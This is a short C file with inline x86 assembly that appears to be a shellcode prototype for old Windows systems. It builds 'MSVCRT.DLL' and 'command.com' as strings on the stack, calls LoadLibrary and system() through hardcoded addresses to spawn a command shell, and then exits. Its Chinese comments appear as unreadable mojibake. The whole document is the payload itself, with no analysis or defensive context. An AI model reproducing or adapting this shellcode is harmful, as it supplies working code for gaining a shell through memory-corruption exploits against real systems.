#include <windows.h>
#include <winbase.h>

void main()
{

       __asm {
/*LoadLibrary("msvcrt.dll");*/
			      push ebp
                  mov ebp,esp
                  xor eax,eax
                  push eax
                  push eax

                  push eax
                  mov byte ptr[ebp-0Ch],4Dh
                  mov byte ptr[ebp-0Bh],53h
                  mov byte ptr[ebp-0Ah],56h
                  mov byte ptr[ebp-09h],43h
                  mov byte ptr[ebp-08h],52h
                  mov byte ptr[ebp-07h],54h
                  mov byte ptr[ebp-06h],2Eh
                  mov byte ptr[ebp-05h],44h
                  mov byte ptr[ebp-04h],4Ch
                  mov byte ptr[ebp-03h],4Ch
                  mov edx,0x77E5D961    //LoadLibrary
                  push edx
                  lea eax,[ebp-0Ch]
                  push eax
                  call dword ptr[ebp-10h]

				/* system("command.com") */
			   mov esp,ebp                 ;��ebp�����ݸ�ֵ��esp
               push ebp                    ;����ebp��esp��4
               mov ebp,esp                 ;��ebp����ֵ������Ϊ�ֲ������Ļ�ָ��
               xor edi,edi                 ;
               push edi                    ;ѹ��0��esp��4��
                                           ;�����ǹ����ַ����Ľ�β\0�ַ���
               sub esp,08h                 ;�������棬һ����12���ֽڣ�
                                           ;������"command.com"��
               mov byte ptr [ebp-0ch],63h  ;
               mov byte ptr [ebp-0bh],6fh  ;
               mov byte ptr [ebp-0ah],6dh  ;
               mov byte ptr [ebp-09h],6Dh  ;
               mov byte ptr [ebp-08h],61h  ;
               mov byte ptr [ebp-07h],6eh  ;
               mov byte ptr [ebp-06h],64h  ;
               mov byte ptr [ebp-05h],2Eh  ;
               mov byte ptr [ebp-04h],63h  ;
               mov byte ptr [ebp-03h],6fh  ;
               mov byte ptr [ebp-02h],6dh  ;���ɴ�"command.com".
               lea eax,[ebp-0ch]           ;
               push eax                    ;����ַ��Ϊ������ջ
               mov eax, 0x77bf8044         ;
               call eax                    ;����system
				
				/* exit */
				  push ebp
                  mov ebp,esp
                  mov edx,0x77c07adc
                  push edx
                  xor eax,eax
                  push eax
                  call dword ptr[ebp-04h]

       }
}